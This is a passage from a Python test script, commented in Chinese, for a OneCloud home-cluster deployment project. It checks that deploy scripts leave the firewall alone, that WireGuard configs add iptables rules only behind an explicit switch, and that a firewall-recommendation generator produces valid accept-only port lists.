            # 先把引号里的内容抹掉: `ufw status ... | grep -qi 'Default: allow'`
            # 是在**读**状态, 里面的 allow 不是动作。
            probe = re.sub(r"'[^']*'", "''", s)
            probe = re.sub(r'"[^"]*"', '""', probe)
            if fw_write_re.search(probe):
                offenders.append(f"{f.name}:{ln}: {s[:90]}")
    if not offenders:
        log_pass(f"部署侧 {len(scan_files)} 个脚本均无会写入的防火墙命令")
    else:
        log_fail("部署脚本里出现会改防火墙的命令",
                 "改防火墙只能由 setup_firewall.sh 执行:\n     " + "\n     ".join(offenders[:8]))

    wsrc = wg.read_text(encoding="utf-8")
    gsrc = gk.read_text(encoding="utf-8")
    for tag, src, has_flags in (("wireguard-setup.sh", wsrc, True),
                                ("generate-keys.sh", gsrc, False)):
        if 'WG_FIREWALL="${ONECLOUD_WG_FIREWALL:-0}"' in src:
            log_pass(f"{tag}: ONECLOUD_WG_FIREWALL 默认 0 (默认不写防火墙规则)")
        else:
            log_fail(f"{tag}: 缺少 WG_FIREWALL 默认关闭的判定")
        if has_flags:
            if "--with-wg-firewall" in src and "--no-wg-firewall" in src:
                log_pass(f"{tag}: 保留显式开关 (--with-wg-firewall / --no-wg-firewall)")
            else:
                log_fail(f"{tag}: 缺少显式开关")
        else:
            if "ONECLOUD_WG_FIREWALL=1" in src:
                log_pass(f"{tag}: 节点本地一次性脚本, 用 ONECLOUD_WG_FIREWALL=1 恢复自带规则")
            else:
                log_fail(f"{tag}: 未说明如何恢复自带规则")

    if "firewall-recommend.sh" in dep.read_text(encoding="utf-8"):
        log_pass("deploy.sh 分发完成后生成防火墙建议清单 (控制端静态生成, 不碰节点)")
    else:
        log_fail("deploy.sh 未接入建议清单生成")

    isrc = init_sh.read_text(encoding="utf-8")
    if "maint_fw_recommend" in isrc and "firewall-recommend.sh" in isrc:
        log_pass("init.sh 维护菜单提供「生成防火墙设置建议清单」入口")
    else:
        log_fail("init.sh 未提供建议清单入口")

    # ---------------- B/C 行为验证 ----------------
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t27_"))
    try:
        # 复制一份最小项目树: 让 wireguard-setup.sh 的产物落在临时目录里
        proj = tmpdir / "proj"
        shutil.copytree(SCRIPTS_DIR, proj / "scripts",
                        ignore=shutil.ignore_patterns("__pycache__"))
        shutil.copytree(PROJECT_ROOT / "inventory", proj / "inventory",
                        ignore=shutil.ignore_patterns("*.local.yaml", "*.bak"))

        # mock wg: genkey 输出固定私钥, pubkey 把 stdin 加前缀
        mockbin = tmpdir / "mockbin"
        mockbin.mkdir()
        (mockbin / "wg").write_text(
            "#!/bin/bash\n"
            'case "${1:-}" in\n'
            '  genkey) echo "cHJpdmF0ZS1rZXktZm9yLXRlc3QtMDAwMDAwMDAwMDAwMDA9" ;;\n'
            '  pubkey) sed "s/^/PUBKEY_/" ;;\n'
            "  *) exit 1 ;;\n"
            "esac\n", encoding="utf-8", newline="\n")
        try:
            os.chmod(mockbin / "wg", 0o755)
        except OSError:
            pass

        env = dict(os.environ)
        env["PATH"] = _posix(mockbin) + ":/usr/bin:/bin"
        env["BASH_ENV"] = ""
        env.pop("ONECLOUD_WG_FIREWALL", None)
        env.pop("ENV", None)

        def run_sh(argv, extra_env=None, cwd=proj, timeout=120):
            # 注意: argv 里的路径要用 POSIX 形式 (给 bash), 但 cwd 必须是
            # Windows 原生路径 —— Python 的 CreateProcess 不认 /d/... 形式。
            e = dict(env)
            if extra_env:
                e.update(extra_env)
            return subprocess.run(["bash"] + argv, env=e, cwd=str(cwd),
                                  capture_output=True, text=True,
                                  encoding="utf-8", errors="replace",
                                  stdin=subprocess.DEVNULL, timeout=timeout)

        wg_script = _posix(proj / "scripts" / "wireguard-setup.sh")
        conf = proj / "node-wk-edge-01" / "wireguard" / "wg0.conf"

        # ---- B1) 默认: wg0.conf 不带任何防火墙规则 ----
        r1 = run_sh([wg_script, "gen"])
        if r1.returncode == 0 and conf.exists():
            body = conf.read_text(encoding="utf-8", errors="replace")
            # 只看会生效的行: 注释里刻意留了"手工该怎么做"的示例命令, 那是说明
            bad = [l for l in body.splitlines()
                   if not l.lstrip().startswith("#")
                   and ("iptables" in l or "PostUp" in l or "PostDown" in l)]
            if not bad:
                log_pass("默认生成的 wg0.conf 不含生效的 PostUp/PostDown/iptables 行")
            else:
                log_fail("默认 wg0.conf 仍自带防火墙规则", "\n".join(bad))
            if "setup_firewall.sh" in body:
                log_pass("wg0.conf 内注明「防火墙规则由 setup_firewall.sh 统一管理」")
            else:
                log_fail("wg0.conf 未说明防火墙归属", "现场会误以为规则已由 wg 自带")
        else:
            log_fail(f"wireguard-setup.sh gen 未生成 wg0.conf (rc={r1.returncode})",
                     (r1.stdout + r1.stderr)[-400:])

        # ---- B2) 显式开关: 才写规则, 且幂等、不写死网卡 ----
        r2 = run_sh([wg_script, "gen"], extra_env={"ONECLOUD_WG_FIREWALL": "1"})
        if r2.returncode == 0 and conf.exists():
            body2 = conf.read_text(encoding="utf-8", errors="replace")
            if "PostUp" in body2 and "PostDown" in body2 and "iptables -C" in body2:
                log_pass("ONECLOUD_WG_FIREWALL=1 时才写 PostUp/PostDown, 且用 -C 探测 (幂等)")
            else:
                log_fail("显式开关未按预期生成规则",
                         "\n".join(l for l in body2.splitlines()
                                   if "Post" in l or "iptables" in l)[:400])
            if "-o eth0" in body2 or "-o end0" in body2:
                log_fail("MASQUERADE 写死了网卡", "玩客云可能是 end0, NAT 会静默失效")
            else:
                log_pass("MASQUERADE 的出网网卡由节点侧探测 (不写死 eth0/end0)")
        else:
            log_fail(f"开关模式下 gen 失败 (rc={r2.returncode})",
                     (r2.stdout + r2.stderr)[-300:])

        # ---- C1) 建议清单: DSL 语法 ----
        rec_path = _posix(rec)
        dsl = run_sh([rec_path, "--emit-dsl"], cwd=PROJECT_ROOT, timeout=60)
        lines = [l.strip() for l in dsl.stdout.splitlines() if l.strip()]
        dsl_re = re.compile(
            r"^(in|out)\s+(accept|drop)\s+(tcp|udp|any)\s+(\S+)\s+(\S+)\s+(\S+)$")
        bad_lines = [l for l in lines if not dsl_re.match(l)]
        if lines and not bad_lines:
            log_pass(f"建议清单输出 {len(lines)} 条 DSL 行, 全部符合 6 列语法 (可直接录入)")
        else:
            log_fail("建议清单 DSL 行格式不合法",
                     f"bad={bad_lines[:3]} lines={lines[:3]}")

        not_accept = [l for l in lines if not l.startswith("in accept")]
        if lines and not not_accept:
            log_pass("建议清单只给放行建议 (无 drop/out 行, 不替用户做封禁决策)")
        elif not_accept:
            log_fail("建议清单里混入了非放行建议", str(not_accept[:3]))

        # ---- C2) 端口来源与 services.yaml / 节点清单一致 ----
        got = set()
        for l in lines:
            m = dsl_re.match(l)
            if m:
                got.add((m.group(3), m.group(4)))
        need = [("tcp", "22"), ("udp", "51820"), ("tcp", "9000"), ("tcp", "3000"),
                ("udp", "53"), ("tcp", "9090"), ("tcp", "8123"), ("tcp", "8080"),
                ("tcp", "8083"), ("tcp", "8384"), ("tcp", "22000"), ("udp", "21027"),
                ("tcp", "6800"), ("tcp", "631"), ("tcp", "222")]
        absent = [f"{p}/{n}" for p, n in need if (p, n) not in got]
        if not absent:
            log_pass(f"清单覆盖 {len(need)} 个清单声明的端口 (SSH/面板/WG/host 网络/容器映射)")
        else:
            log_fail("清单漏了 services.yaml 里声明的端口", f"缺失: {absent}")

        # ---- C3) 完整报告: 变量端口要显式提示人工确认 ----
        rep = run_sh([rec_path, "--stdout"], cwd=PROJECT_ROOT, timeout=60)
        text = rep.stdout
        if "onecloud 的部署脚本不会改防火墙" in text and "setup_firewall.sh" in text:
            log_pass("清单开宗明义说明「部署脚本不改防火墙」并指明唯一执行入口")
        else:
            log_fail("清单未说明防火墙归属")

        edge_txt = rep.stdout.split(" OneCloud 防火墙建议清单 — wk-iot-02")[0]
        iot_txt = text.split(" OneCloud 防火墙建议清单 — wk-iot-02")[-1]
        if "MASQUERADE" in edge_txt and "sysctl" in edge_txt:
            log_pass("Hub 节点给出 WireGuard 转发/NAT 命令段 (DSL 表达不了的部分)")
        else:
            log_fail("Hub 节点缺少 FORWARD/NAT 命令段", "wg 客户端会上不了网")
        if "MASQUERADE" not in iot_txt:
            log_pass("非 Hub 节点不给转发/NAT 命令段 (避免误导)")
        else:
            log_fail("非 Hub 节点也给了转发命令")

        if "MEMOS_PORT" in text and "人工确认" in text:
            log_pass("变量端口 (如 ${MEMOS_PORT}) 单独列出要求人工确认, 未静默丢弃")
        else:
            log_fail("变量端口被静默丢弃", "清单必须显式提示人工确认")

        # ---- C4) 落盘 ----
        outdir = tmpdir / "fwout"
        r5 = run_sh([rec_path, "--out", _posix(outdir)], cwd=PROJECT_ROOT, timeout=60)
        made = sorted(p.name for p in outdir.glob("*.txt")) if outdir.exists() else []
        if r5.returncode == 0 and len(made) >= 3:
            okfile = all("in accept tcp 22" in (outdir / n).read_text(
                encoding="utf-8", errors="replace") for n in made)
            if okfile:
                log_pass(f"建议清单按节点落盘: {', '.join(made)}")
            else:
                log_fail("落盘的清单缺少 SSH 放行行", str(made))
        else:
            log_fail(f"建议清单落盘失败 (rc={r5.returncode})", (r5.stdout + r5.stderr)[-300:])

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 主程序 ============
def main():
    print("=" * 60)
    print("OneCloud Cluster 功能验证")
    print("=" * 60)
    print(f"项目路径: {PROJECT_ROOT}")
    
    # 运行所有测试
    tests = [
        ("配置文件完整性", test_config_files),
        ("节点目录结构", test_node_directories),
        ("脚本语法检查", test_script_syntax),
        ("deploy.sh 节点映射", test_deploy_node_mapping),
        ("fallback 机制", test_fallback_mechanism),
        ("health-check 变量", test_health_check_variables),
        ("cloudflared 命令", test_cloudflared_command),
        ("panel 错误处理", test_panel_app_error_handling),
        ("xiaomusic 下载", test_xiaomusic_download),
        ("panel install-service", test_panel_install_service),
        ("服务一致性", test_service_consistency),
        ("文档化 CLI 接口契约", test_cli_contract),
        ("节点 IP 自定义与主机名", test_ip_customizable),
        ("安全与健壮性回归", test_safety_regression),
        ("面板前后端契约", test_panel_frontend_contract),
        ("bootstrap 网络取值", test_bootstrap_network_resolution),
        ("bootstrap SD与风险", test_bootstrap_sd_and_risk),
        ("init 交互式入口", test_init_entrypoint),
        ("交付物一致性", test_delivery_consistency),
        ("Python 依赖降级链", test_pydeps_fallback),
        ("bootstrap apt 源与依赖", test_bootstrap_apt_sources),
        ("bootstrap DNS 模式", test_bootstrap_dns_mode),
        ("面板监听地址", test_panel_listen_host),
        ("bootstrap apt 可选化", test_bootstrap_apt_optional),
        ("防火墙与 SSH 自检", test_network_audit),
        ("面板安装参数", test_panel_install_params),
        ("部署零防火墙改动与建议清单", test_deploy_no_firewall),
    ]
    
    for test_name, test_func in tests:
        log_info(f"运行测试: {test_name}")
        try:
            test_func()
        except Exception as e:
            log_fail(f"测试 '{test_name}' 异常: {str(e)}")
    
    # 生成报告
    success = generate_report()
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
